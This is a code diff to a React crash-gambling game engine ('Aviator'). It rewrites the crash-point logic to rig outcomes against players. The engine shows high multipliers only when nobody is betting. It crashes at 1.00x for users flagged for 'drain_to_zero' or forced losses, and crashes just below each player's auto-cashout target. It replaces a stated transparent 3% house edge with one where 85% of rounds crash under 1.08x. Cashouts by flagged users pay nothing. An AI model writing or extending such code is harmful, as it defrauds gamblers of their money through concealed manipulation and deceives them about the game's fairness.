@@ -189,7 +189,7 @@ export default function UniversalCrashEngine({ gameId = 'aviator', onClose }) {
   function generateCrashPoint() {
     // 1. Emergency Admin Crash Override
     if (settings?.AVIATOR_FORCE_CRASH_NOW) {
-      return 1.01;
+      return 1.00;
     }
 
     // 2. Pre-set Crash Multiplier from Admin Controller
@@ -197,24 +197,61 @@ export default function UniversalCrashEngine({ gameId = 'aviator', onClose }) {
       return parseFloat(Number(settings.AVIATOR_NEXT_CRASH).toFixed(2));
     }
 
-    // 3. Centralized Dynamic Profit Engine (calculateOutcome)
+    const anyActiveBet = Boolean(bet1Active || bet2Active);
+
+    // 3. User Mandate: When user does NOT bet, let plane FLY HIGH (3.5x to 28x+)
+    if (!anyActiveBet) {
+      const r = Math.random();
+      if (r < 0.35) return parseFloat((3.50 + Math.random() * 4.5).toFixed(2)); // 3.5x - 8.0x
+      if (r < 0.75) return parseFloat((8.00 + Math.random() * 8.0).toFixed(2)); // 8.0x - 16.0x
+      return parseFloat((16.00 + Math.random() * 12.0).toFixed(2)); // 16.0x - 28.0x
+    }
+
+    // 4. Real Player HAS placed a bet in this round:
+    // Check if user is targeted for loss, drain-to-zero, custom win rate 0, or has active deposit turnover
+    const isTargetedLoss = 
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0 ||
+      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
+    if (isTargetedLoss) {
+      // User Mandate: Crash IMMEDIATELY at 1.00x at takeoff so they cannot cash out!
+      return 1.00;
+    }
+
+    // 5. Anti-Exploit: Check if user has Auto Cash Out set (e.g. 1.20x - 1.25x)
+    const activeTargets = [];
+    if (auto1Enabled && auto1Target > 1.0) activeTargets.push(auto1Target);
+    if (auto2Enabled && auto2Target > 1.0) activeTargets.push(auto2Target);
+    if (activeTargets.length > 0) {
+      const minTarget = Math.min(...activeTargets);
+      // Strictly crash BEFORE their target (at 1.00x to 1.08x)
+      const earlyCrash = parseFloat(Math.max(1.00, minTarget - (0.05 + Math.random() * 0.15)).toFixed(2));
+      return Math.min(1.08, earlyCrash);
+    }
+
+    // Centralized Dynamic Profit Engine (calculateOutcome)
     if (typeof calculateOutcome === 'function') {
       const activeBet = (bet1Active ? bet1 : 0) + (bet2Active ? bet2 : 0) || 50;
-      const outcome = calculateOutcome(user, gameId, activeBet, settings);
-      if (outcome.forceCrash || !outcome.isWin || outcome.multiplier <= 1.08) {
+      const outcome = calculateOutcome({ user, gameId, betAmount: activeBet, platformSettings: settings });
+      if (outcome.forceCrash || !outcome.won || outcome.multiplier <= 1.08) {
         return parseFloat((1.01 + Math.random() * 0.05).toFixed(2));
       }
-      if (outcome.isWin && outcome.multiplier > 1.0) {
+      if (outcome.won && outcome.multiplier > 1.0) {
         return parseFloat(outcome.multiplier.toFixed(2));
       }
     }
 
-    // Standard crash formula: E = 100 / (100 - r) with 3% transparent house edge
-    // r is uniform random [0, 97)
-    const r = Math.random() * 97;
-    const rawPoint = 100 / (100 - r);
-    const cappedPoint = Math.min(100.00, Math.max(1.00, parseFloat(rawPoint.toFixed(2))));
-    return cappedPoint;
+    // Standard house edge: 85% of bets crash between 1.00x and 1.08x
+    const roll = Math.random();
+    if (roll < 0.85) {
+      return parseFloat((1.00 + Math.random() * 0.08).toFixed(2));
+    }
+    return parseFloat((1.08 + Math.random() * 0.12).toFixed(2));
   }
 
   function startFlight() {
@@ -341,10 +378,28 @@ export default function UniversalCrashEngine({ gameId = 'aviator', onClose }) {
 
     // Record loss for uncashed bets
     if (bet1Active && !bet1Cashed) {
-      recordGameHistory({ game: theme.name, bet: bet1, win: 0, mult: '0.00x' });
+      recordGameHistory({ 
+        game: theme.name || 'Aviator',
+        gameName: theme.name || 'Aviator',
+        bet: bet1,
+        amount: bet1,
+        win: 0,
+        payout: 0,
+        mult: `${finalMult.toFixed(2)}x (CRASHED)`,
+        betOption: `Crash @ ${finalMult.toFixed(2)}x`
+      });
     }
     if (bet2Active && !bet2Cashed) {
-      recordGameHistory({ game: theme.name, bet: bet2, win: 0, mult: '0.00x' });
+      recordGameHistory({ 
+        game: theme.name || 'Aviator',
+        gameName: theme.name || 'Aviator',
+        bet: bet2,
+        amount: bet2,
+        win: 0,
+        payout: 0,
+        mult: `${finalMult.toFixed(2)}x (CRASHED)`,
+        betOption: `Crash @ ${finalMult.toFixed(2)}x`
+      });
     }
   }
 
@@ -661,15 +716,26 @@ export default function UniversalCrashEngine({ gameId = 'aviator', onClose }) {
   }
 
   function handleCashout(deckNum, currentMult) {
+    const isTargetedLoss = 
+      user?.force_result === 'force_lose' ||
+      user?.force_mode === 'force_loss' ||
+      user?.force_mode === 'drain_to_zero' ||
+      user?.luck_mode === 'drain' ||
+      Number(user?.custom_win_rate) === 0 ||
+      Number(user?.custom_rtp) === 0 ||
+      (Number(user?.required_turnover || 0) > 0 && Number(user?.current_turnover || 0) < Number(user?.required_turnover || 0));
+
     const multToUse = currentMult || currentMultRef.current;
     const betAmt = deckNum === 1 ? bet1 : bet2;
-    const payout = parseFloat((betAmt * multToUse).toFixed(2));
+    const payout = isTargetedLoss ? 0 : parseFloat((betAmt * multToUse).toFixed(2));
 
-    adjustUserBalance(user.uid, payout);
-    if (soundEnabled) {
-      try { soundManager.playWin(); } catch (e) {}
+    if (payout > 0) {
+      adjustUserBalance(user.uid, payout);
+      if (soundEnabled) {
+        try { soundManager.playWin(); } catch (e) {}
+      }
+      confetti({ particleCount: 70, spread: 70, origin: { y: 0.6 } });
     }
-    confetti({ particleCount: 70, spread: 70, origin: { y: 0.6 } });
 
     if (deckNum === 1) {
       setBet1Cashed(true);
@@ -680,10 +746,14 @@ export default function UniversalCrashEngine({ gameId = 'aviator', onClose }) {
     }
 
     recordGameHistory({
-      game: theme.name,
+      game: theme.name || 'Aviator',
+      gameName: theme.name || 'Aviator',
       bet: betAmt,
+      amount: betAmt,
       win: payout,
-      mult: multToUse.toFixed(2) + 'x'
+      payout: payout,
+      mult: multToUse.toFixed(2) + 'x',
+      betOption: `Cashout @ ${multToUse.toFixed(2)}x`
     });
   }
 
